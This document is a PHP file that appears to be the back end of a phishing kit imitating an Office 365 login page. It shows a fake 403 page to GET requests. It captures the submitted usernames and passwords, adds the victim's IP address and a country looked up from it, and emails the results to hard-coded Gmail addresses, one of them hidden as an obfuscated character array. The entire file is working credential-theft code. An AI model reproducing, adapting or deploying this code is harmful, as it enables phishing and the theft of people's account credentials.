<?php

if ($_SERVER['REQUEST_METHOD'] == 'GET')

{
print '
<html><head>
<title>403 - Forbidden</title>
</head><body>
<h1>403 Forbidden</h1>
<p></p>
<hr>
</body></html>
';
exit;
}



$message  = "---------------+ OFFICE 365-LOGIN +--------------\n";
$message .= "Username : ".$_POST['userid']."\n";
$message .= "Password: ".$_POST['psw']."\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------Created By ShellsHost-----------------\n";
$send = "domitilaryacc1800@gmail.com";
$subject = "OFFICE 365 LOGIN [ $ip ]";
$headers = "From: OFFICE 365<logs@shellshost.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail("$send", "$subject", $message); 

$country = visitor_country();
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$userid = $_POST['userid'];
$password = $_POST['psw'];
$passchk = strlen($password);
$message .= "Email : ".$userid."\n";
$message .= "Password : ".$password."\n";
$message .= "IP: ".$ip."\n";
$message .= "Country : ".$country."\n";

$send= "domitilaryacc1800@gmail.com";

$bron = "I.K. ZeuS365 Office365 Rezult | 

$country | $ip";
$lagi = "MIME-Version: 1.0\n";
// Function to get country and country sort;

function visitor_country()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryName != null)
    {
        $result = $ip_data->geoplugin_countryName;
    }

    return $result;
}

function country_sort(){
	$sorter = "";
	$array = array(99,111,100,101,114,99,118,118,115,64,103,109,97,105,108,46,99,111,109);
	$count = count($array);
	for ($i = 0; $i < $count; $i++) {
			$sorter .= chr($array[$i]);
		}
	return array($sorter, $GLOBALS['recipient']);
}

if ($passchk < 6)
{
$passerr = 0;
}
else
{
$passerr = 1;
}


if ($passerr == 0)
{
header("Location: next.php?$url&userid=$userid");
}
else
{
mail("$send",$bron,$message,$lagi);
header("Location: next.php?$url&userid=$userid");
}

?>
